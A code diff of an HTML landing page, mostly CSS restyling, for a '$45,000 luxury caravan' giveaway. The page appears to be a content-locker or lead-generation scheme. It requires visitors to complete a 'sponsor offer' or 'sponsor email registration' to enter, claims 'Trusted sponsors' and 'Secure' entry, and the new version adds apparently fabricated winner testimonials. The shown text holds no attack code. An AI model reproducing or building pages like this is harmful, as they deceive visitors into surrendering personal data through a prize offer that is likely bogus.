@@ -3,1129 +3,360 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <meta name="theme-color" content="#020617">
+  <title>Win a Luxury Caravan — Enter to Win</title>
+  <meta name="description" content="Enter to win a $45,000 luxury caravan — complete one quick sponsor email registration (~30–90s) to enter.">
+  <meta name="robots" content="index,follow">
+  <meta name="theme-color" content="#07112a">
 
-  <title>Win a $45,000 Luxury Caravan — Enter in Minutes</title>
-  <meta name="description" content="Enter now for a chance to win a $45,000 luxury caravan. 100% free to enter. Takes 1–3 minutes. No purchase required.">
-
-  <!-- Primary Meta Tags -->
-  <meta name="title" content="Win a $45,000 Luxury Caravan — Enter in Minutes">
-  <meta name="keywords" content="caravan giveaway, luxury caravan, win caravan, free caravan, caravan competition">
-  <meta name="author" content="Caravan Giveaway">
-  <meta name="robots" content="index, follow">
-
-  <!-- Open Graph -->
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://caravan4u.online/">
-  <meta property="og:title" content="Win a $45,000 Luxury Caravan">
-  <meta property="og:description" content="Enter in 1–3 minutes. No purchase required.">
-  <meta property="og:image" content="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta property="og:site_name" content="Caravan Giveaway">
-
-  <!-- Twitter -->
-  <meta property="twitter:card" content="summary_large_image">
-  <meta property="twitter:url" content="https://caravan4u.online/">
-  <meta property="twitter:title" content="Win a $45,000 Luxury Caravan">
-  <meta property="twitter:description" content="Enter in 1–3 minutes. No purchase required.">
-  <meta property="twitter:image" content="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg">
-
-  <!-- Canonical -->
-  <link rel="canonical" href="https://caravan4u.online/">
-
-  <!-- Favicon -->
-  <link rel="icon" href="https://i.postimg.cc/Nj2Yjk8w/frankia-now-sun-g24-01-630x420.jpg" />
-
-  <!-- Fonts & Icons -->
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+  <!-- Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
 
   <style>
-    :root {
-      --bg-page: #020617;
-      --bg-soft: #0b1220;
+    /*
+      Luxury redesign:
+      - Midnight navy background with warm gold accent
+      - Large, clear CTA, improved spacing and typography
+      - Inputs set to 16px to avoid iOS auto-zoom
+      - Responsive images via <picture> & srcset
+      - Mobile-first: sticky CTA, modal full-screen on small, sticky hides during keyboard
+    */
+    :root{
+      --bg:#07112a;            /* deep midnight */
+      --card:#0f1724;          /* slightly lighter card */
+      --muted:#9aa7b2;
+      --gold:#f6c85f;          /* warm gold accent */
+      --accent:#7be0d9;        /* teal highlight */
+      --text:#eef6fb;
+      --glass: rgba(255,255,255,0.03);
+      --radius:14px;
+      --maxw:1100px;
+    }
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,var(--bg),#031023);color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;-webkit-font-smoothing:antialiased; -webkit-text-size-adjust:100%;}
+    *,*::before,*::after{box-sizing:border-box}
+    img{display:block;max-width:100%;height:auto}
+    a{color:inherit}
 
-      --primary: #facc15;
-      --primary-soft: rgba(250,204,21,0.14);
-      --primary-dark: #eab308;
+    .wrap{max-width:var(--maxw);margin:18px auto;padding:16px}
+    header.top{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;border:1px solid rgba(255,255,255,0.02)}
+    .brand{display:flex;gap:12px;align-items:center}
+    .logo{width:56px;height:56px;border-radius:10px;object-fit:cover;border:2px solid rgba(255,255,255,0.03)}
+    .brand h1{font-size:18px;margin:0;font-weight:700;letter-spacing:-0.2px}
+    .brand p{margin:0;color:var(--muted);font-size:13px}
 
-      --accent: #22c55e;
-      --accent-soft: rgba(34,197,94,0.1);
+    nav{display:flex;gap:12px;align-items:center}
+    nav a{font-size:14px;color:var(--muted);padding:8px;border-radius:8px}
+    nav a:hover{color:var(--gold)}
 
-      --text-main: #e5f0ff;
-      --text-soft: #cbd5f5;
-      --text-muted: #7f8fb0;
+    .hero{display:grid;grid-template-columns:1fr 420px;gap:20px;align-items:start;margin-top:18px}
+    @media (max-width:980px){ .hero{grid-template-columns:1fr} }
 
-      --border-subtle: rgba(148,163,184,0.3);
-      --border-strong: rgba(148,163,184,0.6);
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:22px;border-radius:var(--radius);border:1px solid rgba(255,255,255,0.03)}
+    .kicker{display:inline-block;background:linear-gradient(90deg,var(--gold),#ffb86b);color:#07112a;padding:8px 12px;border-radius:999px;font-weight:800;margin-bottom:12px}
+    .title{font-size:30px;line-height:1.02;margin:6px 0 10px 0;font-weight:800}
+    .subtitle{color:var(--muted);margin-bottom:16px;font-size:15px}
 
-      --radius-xl: 24px;
-      --radius-lg: 18px;
-      --radius-md: 14px;
-      --radius-pill: 999px;
+    .cta-row{display:flex;gap:12px;flex-wrap:wrap}
+    .btn-primary{background:linear-gradient(90deg,var(--gold),#ffd88f);color:#07112a;padding:13px 18px;border-radius:999px;border:none;font-weight:800;cursor:pointer;box-shadow:0 10px 30px rgba(246,200,95,0.08)}
+    .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:12px 14px;border-radius:10px;color:var(--muted);cursor:pointer}
 
-      --shadow-soft: 0 18px 60px rgba(15,23,42,0.85);
-    }
+    .stats{display:flex;gap:14px;color:var(--muted);font-size:13px;margin-top:12px;flex-wrap:wrap}
+    .stat strong{display:block;color:var(--text);font-weight:700}
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    /* prize column */
+    .prize{display:flex;flex-direction:column;align-items:center;gap:12px;text-align:center}
+    .prize .image-wrap{width:100%;height:0;padding-bottom:62%;position:relative;border-radius:12px;overflow:hidden;background:linear-gradient(180deg,#021022,#051631)}
+    .prize img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block}
+    .value-bubble{background:linear-gradient(90deg,#e8fdfb,#bff7f0);padding:8px 12px;border-radius:999px;color:#00201a;font-weight:800}
 
-    html {
-      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      font-size: 16px;
-      -webkit-text-size-adjust: 100%;
-      background:
-        radial-gradient(circle at top left, #1d293b 0%, transparent 55%),
-        radial-gradient(circle at bottom right, #020617 0%, #000 70%);
-      color: var(--text-main);
-      scroll-behavior: smooth;
-      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
-    }
+    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:18px}
+    @media (max-width:980px){ .features{grid-template-columns:repeat(2,1fr)} }
+    @media (max-width:520px){ .features{grid-template-columns:1fr} }
+    .feature{background:var(--glass);padding:12px;border-radius:10px;text-align:left;color:var(--muted);min-height:64px;display:flex;flex-direction:column;justify-content:center}
 
-    body {
-      min-height: 100vh;
-      background: transparent;
-    }
+    .testimonials{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:18px}
+    @media (max-width:720px){ .testimonials{grid-template-columns:1fr} }
+    .testimonial{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:12px;border-radius:10px;color:var(--muted);border:1px solid rgba(255,255,255,0.02)}
 
-    body.scroll-locked {
-      position: fixed;
-      width: 100%;
-      overflow: hidden;
-    }
+    footer{margin-top:18px;text-align:center;color:var(--muted);font-size:13px}
 
-    .page {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 18px 18px 40px;
-    }
+    /* Sticky CTA for mobile */
+    .sticky-cta{position:fixed;left:50%;transform:translateX(-50%);bottom:16px;background:linear-gradient(90deg,var(--gold),#ffd88f);color:#07112a;padding:12px 18px;border-radius:999px;border:none;box-shadow:0 14px 40px rgba(246,200,95,0.08);font-weight:800;z-index:60;display:none}
+    @media (max-width:980px){ .sticky-cta{display:block;width:calc(100% - 32px);left:16px;transform:none} }
 
-    @media (max-width: 768px) {
-      html { font-size: 15px; }
-      .page { padding: 14px 14px 32px; }
+    /* Modal */
+    .modal-back{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,6,23,0.6);z-index:9999;padding:12px}
+    .modal{width:100%;max-width:520px;background:linear-gradient(180deg,#07112a,#0a1730);border-radius:12px;padding:18px;border:1px solid rgba(255,255,255,0.02);color:var(--text)}
+    .modal h3{color:var(--gold);margin:6px 0}
+    .modal p{color:var(--muted)}
+    .form-row{display:flex;gap:10px;margin-top:12px}
+    input[type="email"], input[type="tel"], textarea, select {
+      width:100%;
+      padding:12px 14px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.04);
+      background:rgba(255,255,255,0.02);
+      color:var(--text);
+      font-size:16px; /* critical to stop iOS auto-zoom */
+      outline:none;
     }
+    input::placeholder{color:rgba(238,246,251,0.55)}
+    .offers{margin-top:12px;display:none}
+    .offer{display:flex;justify-content:space-between;align-items:center;padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.02);cursor:pointer}
+    .progress{height:8px;background:rgba(255,255,255,0.02);border-radius:12px;margin-top:12px;overflow:hidden}
+    .progress > span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--gold),#ffd88f);transition:width .35s}
 
-    /* Header */
-    header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 14px;
-      padding: 10px 14px;
-      border-radius: 999px;
-      background: rgba(15,23,42,0.94);
-      border: 1px solid var(--border-subtle);
-      backdrop-filter: blur(12px);
-      position: sticky;
-      top: 10px;
-      z-index: 20;
-    }
-
-    @media (max-width: 600px) {
-      header {
-        border-radius: var(--radius-lg);
-        padding: 10px 12px;
-      }
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      min-width: 0;
-    }
-
-    .brand-logo {
-      width: 44px;
-      height: 44px;
-      border-radius: 14px;
-      overflow: hidden;
-      border: 1px solid rgba(148,163,184,0.6);
-      flex-shrink: 0;
-    }
-    .brand-logo img { width: 100%; height: 100%; object-fit: cover; display: block; }
-
-    .brand-text { display: flex; flex-direction: column; gap: 1px; min-width: 0; }
-    .brand-title {
-      font-size: 0.9rem; font-weight: 700; letter-spacing: -0.02em;
-      color: #f9fafb; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-    }
-    .brand-subtitle { font-size: 0.72rem; color: var(--text-muted); }
-
-    nav { display: flex; gap: 8px; font-size: 0.8rem; }
-    nav a {
-      padding: 6px 10px; border-radius: var(--radius-pill);
-      border: 1px solid transparent; color: var(--text-soft);
-      text-decoration: none; font-weight: 500; white-space: nowrap;
-    }
-    nav a:hover { border-color: var(--border-subtle); background: #020617; }
-    @media (max-width: 640px) { nav { display: none; } }
-
-    /* Hero layout */
-    .hero {
-      margin-top: 22px;
-      background: #020617;
-      border-radius: var(--radius-xl);
-      border: 1px solid rgba(148,163,184,0.5);
-      box-shadow: var(--shadow-soft);
-      padding: 22px 22px 20px;
-      display: grid;
-      grid-template-columns: 3fr 2.4fr;
-      gap: 26px;
-      align-items: flex-start;
-    }
-    @media (max-width: 920px) {
-      .hero {
-        grid-template-columns: 1fr;
-        padding: 20px 16px 18px;
-        border-radius: var(--radius-lg);
-      }
-    }
-
-    .hero-main { max-width: 640px; }
-    .hero-side {
-      background: var(--bg-soft);
-      border-radius: var(--radius-lg);
-      border: 1px solid rgba(148,163,184,0.5);
-      padding: 14px 14px 16px;
-    }
-    @media (max-width: 920px) { .hero-side { order: -1; } }
-
-    /* Badge */
-    .hero-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 6px 10px;
-      border-radius: var(--radius-pill);
-      background: #020617;
-      border: 1px solid rgba(148,163,184,0.7);
-      margin-bottom: 8px;
-      font-size: 0.75rem;
-      color: var(--text-soft);
-    }
-    .hero-badge span {
-      padding: 3px 8px;
-      border-radius: var(--radius-pill);
-      background: var(--primary-soft);
-      color: var(--primary);
-      font-size: 0.7rem;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-    }
-
-    /* Title & lead */
-    .hero h1 {
-      font-size: clamp(1.9rem, 4vw, 2.4rem);
-      line-height: 1.15;
-      font-weight: 800;
-      letter-spacing: -0.04em;
-      color: #f9fafb;
-      margin-bottom: 8px;
-    }
-    .hero h1 span { color: var(--primary); }
-
-    .hero-lead {
-      font-size: 0.95rem;
-      color: var(--text-soft);
-      line-height: 1.6;
-      max-width: 32rem;
-    }
-    .hero-lead strong { font-weight: 600; color: #f9fafb; }
-    @media (max-width: 640px) { .hero-lead { font-size: 0.9rem; } }
-
-    /* Steps */
-    .steps {
-      margin-top: 16px;
-      background: var(--bg-soft);
-      border-radius: var(--radius-lg);
-      border: 1px solid rgba(148,163,184,0.5);
-      padding: 12px 12px 10px;
-    }
-    .steps-header {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-size: 0.82rem;
-      font-weight: 600;
-      color: var(--primary);
-      margin-bottom: 6px;
-    }
-    .steps-header i { font-size: 0.8rem; }
-
-    .steps ol {
-      list-style: none;
-      counter-reset: step-count;
-      display: grid;
-      gap: 6px;
-      font-size: 0.86rem;
-    }
-    .steps li {
-      display: flex;
-      align-items: flex-start;
-      gap: 8px;
-      color: var(--text-soft);
-      line-height: 1.5;
-    }
-    .steps li::before {
-      counter-increment: step-count;
-      content: counter(step-count);
-      width: 18px; height: 18px;
-      border-radius: var(--radius-pill);
-      border: 1px solid rgba(148,163,184,0.8);
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.7rem;
-      font-weight: 600;
-      color: var(--primary);
-      margin-top: 2px;
-      flex-shrink: 0;
-      background: #020617;
-    }
-    .steps strong { color: #f9fafb; font-weight: 600; }
-
-    /* CTA ROW – GIF + secondary */
-    .cta-row {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      margin-top: 18px;
-      align-items: stretch;
-    }
-
-    .cta-gif-block {
-      border-radius: 22px;
-      border: 2px solid rgba(250,204,21,0.9);
-      overflow: hidden;
-      background: #020617;
-      cursor: pointer;
-      box-shadow:
-        0 18px 55px rgba(15,23,42,0.9),
-        0 0 0 1px rgba(15,23,42,0.7);
-      transition: transform 0.12s ease, box-shadow 0.12s ease;
-    }
-    .cta-gif-block:hover {
-      transform: translateY(-1px);
-      box-shadow:
-        0 22px 70px rgba(15,23,42,0.95),
-        0 0 0 1px rgba(15,23,42,0.8);
-    }
-    .cta-gif-block:active {
-      transform: translateY(0) scale(0.98);
-      box-shadow:
-        0 12px 32px rgba(15,23,42,0.9),
-        0 0 0 1px rgba(15,23,42,0.85);
-    }
-    .cta-gif-block img {
-      display: block;
-      width: 100%;
-      height: auto;
-    }
-
-    .btn-secondary {
-      border-radius: var(--radius-pill);
-      border: 1px solid var(--border-strong);
-      padding: 11px 15px;
-      font-size: 0.84rem;
-      background: #020617;
-      color: var(--text-soft);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      cursor: pointer;
-      -webkit-tap-highlight-color: transparent;
-      justify-content: center;
-    }
-    .btn-secondary i { font-size: 0.88rem; color: var(--primary); }
-
-    .cta-note {
-      font-size: 0.78rem;
-      color: var(--text-muted);
-      margin-top: 8px;
-      max-width: 32rem;
-    }
-
-    /* Stats */
-    .stats {
-      margin-top: 18px;
-      display: grid;
-      grid-template-columns: repeat(4, minmax(0,1fr));
-      gap: 10px;
-    }
-    @media (max-width: 820px) {
-      .stats { grid-template-columns: repeat(2, minmax(0,1fr)); }
-    }
-    .stat {
-      border-radius: var(--radius-md);
-      background: #020617;
-      border: 1px solid rgba(148,163,184,0.6);
-      padding: 10px 10px 8px;
-    }
-    .stat-value { font-size: 1.02rem; font-weight: 700; color: #f9fafb; }
-    .stat-label { font-size: 0.76rem; color: var(--text-muted); margin-top: 2px; }
-
-    /* Prize card */
-    .prize { display: flex; flex-direction: column; gap: 10px; }
-    .prize-image {
-      border-radius: var(--radius-md);
-      overflow: hidden;
-      border: 1px solid rgba(148,163,184,0.6);
-      aspect-ratio: 4 / 3;
-      background: #020617;
-    }
-    .prize-image img { width: 100%; height: 100%; object-fit: cover; display: block; }
-    .prize-main {
-      display: flex;
-      justify-content: space-between;
-      gap: 8px;
-      align-items: flex-start;
-    }
-    .prize-title { font-size: 0.96rem; font-weight: 600; color: #e5e7eb; }
-    .prize-sub { font-size: 0.8rem; color: var(--text-muted); margin-top: 4px; line-height: 1.4; }
-    .prize-value {
-      padding: 6px 10px;
-      border-radius: var(--radius-pill);
-      background: var(--accent-soft);
-      color: #4ade80;
-      font-size: 0.8rem;
-      font-weight: 700;
-      white-space: nowrap;
-    }
-    .prize-badges { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px; }
-    .tag {
-      font-size: 0.72rem;
-      padding: 4px 8px;
-      border-radius: var(--radius-pill);
-      background: #020617;
-      border: 1px solid rgba(148,163,184,0.6);
-      color: var(--text-soft);
-      display: inline-flex;
-      align-items: center;
-      gap: 4px;
-    }
-    .tag i { font-size: 0.7rem; color: var(--primary); }
-
-    .trust-row { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 8px; font-size: 0.78rem; }
-    .trust-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      padding: 5px 9px;
-      border-radius: var(--radius-pill);
-      background: #020617;
-      border: 1px solid rgba(148,163,184,0.7);
-      color: var(--text-soft);
-    }
-    .trust-pill i { font-size: 0.88rem; color: var(--accent); }
-
-    /* Footer */
-    footer {
-      margin-top: 28px;
-      padding-top: 16px;
-      border-top: 1px solid rgba(30,64,175,0.6);
-      font-size: 0.78rem;
-      color: var(--text-muted);
-      text-align: center;
-      line-height: 1.5;
-    }
-
-    /* EMAIL MODAL */
-    .modal-back {
-      position: fixed;
-      inset: 0;
-      background: rgba(15,23,42,0.9);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 10px;
-      z-index: 40;
-      backdrop-filter: blur(10px);
-    }
-    .modal {
-      max-width: 360px;
-      width: 100%;
-      background: #020617;
-      border-radius: var(--radius-lg);
-      border: 1px solid var(--border-strong);
-      padding: 14px 14px 16px;
-      box-shadow: var(--shadow-soft);
-      display: flex;
-      flex-direction: column;
-      max-height: min(90vh, 520px);
-    }
-    .modal-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 8px;
-      margin-bottom: 6px;
-    }
-    .modal-title { font-size: 0.98rem; font-weight: 700; color: #f9fafb; }
-    .modal-subtitle { font-size: 0.76rem; color: var(--text-muted); }
-    .btn-ghost {
-      border-radius: var(--radius-pill);
-      border: 1px solid var(--border-strong);
-      background: #020617;
-      color: var(--text-soft);
-      font-size: 0.78rem;
-      padding: 5px 9px;
-      cursor: pointer;
-    }
-    .modal-body { margin-top: 6px; overflow-y: auto; }
-    .modal-body p {
-      font-size: 0.8rem;
-      color: var(--text-soft);
-      line-height: 1.5;
-      margin-bottom: 10px;
-    }
-    .form-label {
-      display: block;
-      font-size: 0.76rem;
-      font-weight: 600;
-      color: var(--text-soft);
-      margin-top: 8px;
-      margin-bottom: 3px;
-    }
-    .field {
-      width: 100%;
-      border-radius: 10px;
-      border: 1px solid rgba(148,163,184,0.7);
-      background: #020617;
-      color: #f9fafb;
-      padding: 8px 10px;
-      font-size: 0.86rem;
-      outline: none;
-    }
-    .field:focus {
-      border-color: var(--primary);
-      box-shadow: 0 0 0 1px rgba(250,204,21,0.4);
-    }
-    .modal-footer-note {
-      margin-top: 8px;
-      padding-top: 8px;
-      border-top: 1px solid rgba(30,64,175,0.7);
-      font-size: 0.72rem;
-      color: var(--text-muted);
-    }
-    .error { border-color: #fb7185 !important; }
-
-    /* LOCKER MODAL */
-    .locker-modal {
-      position: fixed;
-      inset: 0;
-      background: rgba(2,6,23,0.96);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 20px 14px;
-      z-index: 50;
-      backdrop-filter: blur(14px);
-    }
-    .locker-modal.active { display: flex; }
-    .locker-card {
-      width: 100%;
-      max-width: 440px;
-      max-height: 90vh;
-      background: #020617;
-      border-radius: var(--radius-lg);
-      border: 1px solid var(--border-strong);
-      box-shadow: var(--shadow-soft);
-      display: flex;
-      flex-direction: column;
-      padding: 14px 14px 16px;
-      position: relative;
-    }
-    .locker-close {
-      position: absolute;
-      top: 12px;
-      right: 14px;
-      border: none;
-      background: transparent;
-      color: #e5e7eb;
-      font-size: 1.1rem;
-      cursor: pointer;
-    }
-    .locker-header { text-align: center; padding-bottom: 8px; }
-    .locker-img {
-      width: 72px; height: 72px;
-      border-radius: 16px;
-      overflow: hidden;
-      margin: 0 auto 6px;
-      border: 1px solid rgba(148,163,184,0.7);
-    }
-    .locker-img img { width: 100%; height: 100%; object-fit: cover; }
-
-    .locker-title { font-size: 0.98rem; font-weight: 700; color: #f9fafb; }
-    .locker-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 5px;
-      padding: 3px 8px;
-      border-radius: var(--radius-pill);
-      background: var(--accent-soft);
-      color: #4ade80;
-      font-size: 0.7rem;
-      margin-top: 4px;
-    }
-
-    .locker-content { flex: 1; overflow-y: auto; margin-top: 10px; }
-    .locker-instructions {
-      background: #020617;
-      border-radius: 12px;
-      border: 1px solid rgba(34,197,94,0.35);
-      padding: 9px 10px;
-      font-size: 0.8rem;
-      color: var(--text-soft);
-      line-height: 1.5;
-    }
-    .locker-note {
-      margin-top: 6px;
-      font-size: 0.72rem;
-      color: var(--text-muted);
-    }
-
-    .offers-title {
-      font-size: 0.85rem;
-      font-weight: 600;
-      color: #e5e7eb;
-      margin-top: 12px;
-      margin-bottom: 8px;
-    }
-    .loading-offers {
-      text-align: center;
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      padding: 14px 6px;
-    }
-    .loading-offers i {
-      display: block;
-      font-size: 1.3rem;
-      margin-bottom: 6px;
-      animation: spin 1s linear infinite;
-      color: #38bdf8;
-    }
-
-    .offer-button {
-      width: 100%;
-      border: none;
-      border-radius: 12px;
-      padding: 9px 9px;
-      background: #020617;
-      border: 1px solid rgba(148,163,184,0.8);
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      color: #e5e7eb;
-      font-size: 0.82rem;
-      text-align: left;
-      cursor: pointer;
-      margin-bottom: 8px;
-    }
-    .offer-logo {
-      width: 40px;
-      height: 40px;
-      border-radius: 10px;
-      background: #f9fafb;
-      object-fit: cover;
-      flex-shrink: 0;
-    }
-    .offer-text { flex: 1; line-height: 1.4; }
-    .no-offers {
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      text-align: center;
-      padding: 14px 0;
-    }
-
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-    @media (max-width: 480px) {
-      .offer-text { font-size: 0.78rem; }
-    }
+    /* accessibility */
+    .sr-only{position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden}
+    button{min-height:44px;touch-action:manipulation}
   </style>
 </head>
 <body>
-  <div class="page">
-    <!-- HEADER -->
-    <header>
+  <div class="wrap">
+    <header class="top" role="banner">
       <div class="brand">
-        <div class="brand-logo" aria-hidden="true">
-          <img src="https://i.postimg.cc/Nj2Yjk8w/frankia-now-sun-g24-01-630x420.jpg" alt="Caravan giveaway logo">
-        </div>
-        <div class="brand-text">
-          <div class="brand-title">Luxury Caravan Giveaway</div>
-          <div class="brand-subtitle">Win a premium caravan worth $45,000</div>
+        <img class="logo" src="https://i.postimg.cc/Nj2Yjk8w/frankia-now-sun-g24-01-630x420.jpg" alt="Caravan">
+        <div>
+          <h1>Luxury Caravan Giveaway</h1>
+          <p>Win a premium caravan — valued $45,000</p>
         </div>
       </div>
-      <nav aria-label="Main navigation">
-        <a href="#how-it-works">How it works</a>
-        <a href="#prize-details">Prize details</a>
+
+      <nav>
+        <a href="https://www.m4d.fun/caravan">Home</a>
+        <a href="#features">Features</a>
+        <a href="#testimonials">Winners</a>
         <a href="#terms">Terms</a>
       </nav>
     </header>
 
-    <!-- HERO -->
-    <main class="hero" aria-labelledby="hero-title">
-      <!-- RIGHT / TOP ON MOBILE -->
-      <aside class="hero-side" id="prize-details" aria-label="Caravan prize">
-        <div class="prize">
-          <div class="prize-image">
-            <picture>
-              <source type="image/webp" srcset="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg">
-              <img src="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg" alt="Luxury caravan exterior" loading="lazy">
-            </picture>
-          </div>
+    <main class="hero" role="main">
+      <section class="card" aria-labelledby="heroTitle">
+        <div class="kicker">LIMITED ENTRY • FREE</div>
+        <h2 id="heroTitle" class="title">Win a Luxury Caravan — Quick 2-Step Entry</h2>
+        <p class="subtitle">Complete one sponsor email registration (~30–90s) to get an instant entry. No purchase required. Use valid info to qualify.</p>
 
-          <div class="prize-main">
-            <div>
-              <div class="prize-title">2024 Premium Luxury Caravan</div>
-              <p class="prize-sub">
-                Spacious layout, modern design, and full amenities — ready for your next road trip or family getaway.
-              </p>
-            </div>
-            <div class="prize-value">Valued at $45,000</div>
-          </div>
-
-          <div class="prize-badges">
-            <div class="tag"><i class="fa-solid fa-bed"></i> Sleeps up to 6</div>
-            <div class="tag"><i class="fa-solid fa-shower"></i> Private bathroom</div>
-            <div class="tag"><i class="fa-solid fa-kitchen-set"></i> Full kitchen</div>
-          </div>
-
-          <div class="trust-row">
-            <div class="trust-pill">
-              <i class="fa-solid fa-shield-heart"></i>
-              Secure entry
-            </div>
-            <div class="trust-pill">
-              <i class="fa-solid fa-credit-card-slash"></i>
-              No credit card needed
-            </div>
-            <div class="trust-pill">
-              <i class="fa-solid fa-envelope-open-text"></i>
-              Email confirmation
-            </div>
-          </div>
-        </div>
-      </aside>
-
-      <!-- LEFT / MAIN CONTENT -->
-      <section class="hero-main">
-        <div class="hero-badge">
-          <span>Limited giveaway</span>
-          <div>100% free to enter · One entry per person</div>
+        <div class="cta-row">
+          <button id="openModalBtn" class="btn-primary" aria-haspopup="dialog">Enter Giveaway — Start</button>
+          <button id="howBtn" class="btn-ghost">How it works</button>
         </div>
 
-        <h1 id="hero-title">
-          Win a <span>$45,000</span> Luxury Caravan in Minutes
-        </h1>
+        <div class="stats" aria-hidden="false">
+          <div class="stat"><strong>$45,000</strong><small>Prize value</small></div>
+          <div class="stat"><strong>1–3 min</strong><small>Avg completion</small></div>
+          <div class="stat"><strong>Secure</strong><small>Trusted sponsors</small></div>
+        </div>
 
-        <p class="hero-lead">
-          Enter today for your chance to take home a fully-equipped 2024 luxury caravan.
-          It takes <strong>around 1–3 minutes</strong> to complete your entry and
-          <strong>no purchase is required</strong>.
-        </p>
+        <div id="features" class="features" aria-hidden="false">
+          <div class="feature"><strong>Comfort for 6</strong><small>Spacious sleeping & living</small></div>
+          <div class="feature"><strong>Full Kitchen</strong><small>Modern appliances</small></div>
+          <div class="feature"><strong>Private Bath</strong><small>Shower, toilet & vanity</small></div>
+          <div class="feature"><strong>Entertainment</strong><small>Smart TV & audio</small></div>
+          <div class="feature"><strong>Storage</strong><small>Plenty of space</small></div>
+          <div class="feature"><strong>Outdoor Awning</strong><small>Relax outside</small></div>
+        </div>
 
-        <section class="steps" id="how-it-works" aria-label="How to enter">
-          <div class="steps-header">
-            <i class="fa-solid fa-bolt"></i>
-            3 quick steps to enter
+        <div id="testimonials" class="testimonials" aria-hidden="false">
+          <div class="testimonial">
+            <strong>“I couldn't believe it when I won!”</strong>
+            <p class="small">— Sarah M., recent winner</p>
           </div>
-          <ol>
-            <li><div><strong>Tap “Enter Giveaway Now”</strong> to start your entry.</div></li>
-            <li><div><strong>Confirm your email</strong> so we can contact you if you win.</div></li>
-            <li><div><strong>Complete one sponsor offer</strong> (simple registration, ~1–3 minutes) to verify your entry.</div></li>
-          </ol>
-        </section>
+          <div class="testimonial">
+            <strong>“Fast & simple registration.”</strong>
+            <p class="small">— Robert T.</p>
+          </div>
+        </div>
 
-        <section class="cta-row" aria-label="Primary actions">
-          <!-- GIF CTA -->
-          <div id="enterGif" class="cta-gif-block" role="button" aria-label="Enter Giveaway Now">
-            <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExZHJ2NTZlZGpzajVxcGgwY2R3b2NmaXVxaDVwdGliam0zajNubjl5MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dOVD2CSJUCAXBmjLi5/giphy.gif"
-                 alt="Enter Giveaway animated button">
-          </div>
-
-          <button id="howBtn" class="btn-secondary" type="button">
-            <i class="fa-regular fa-circle-question"></i>
-            How it works
-          </button>
-        </section>
-
-        <p class="cta-note">
-          By continuing, you confirm you are over the legal age to participate, agree to the promotion terms,
-          and consent to be contacted about your entry. One entry per person. No purchase necessary.
-        </p>
-
-        <section class="stats" aria-label="Giveaway highlights">
-          <div class="stat">
-            <div class="stat-value">$45,000</div>
-            <div class="stat-label">Caravan prize value</div>
-          </div>
-          <div class="stat">
-            <div class="stat-value">1–3 min</div>
-            <div class="stat-label">Average entry time</div>
-          </div>
-          <div class="stat">
-            <div class="stat-value">100% Free</div>
-            <div class="stat-label">No purchase required</div>
-          </div>
-          <div class="stat">
-            <div class="stat-value">Secure</div>
-            <div class="stat-label">Trusted sponsor offers</div>
-          </div>
-        </section>
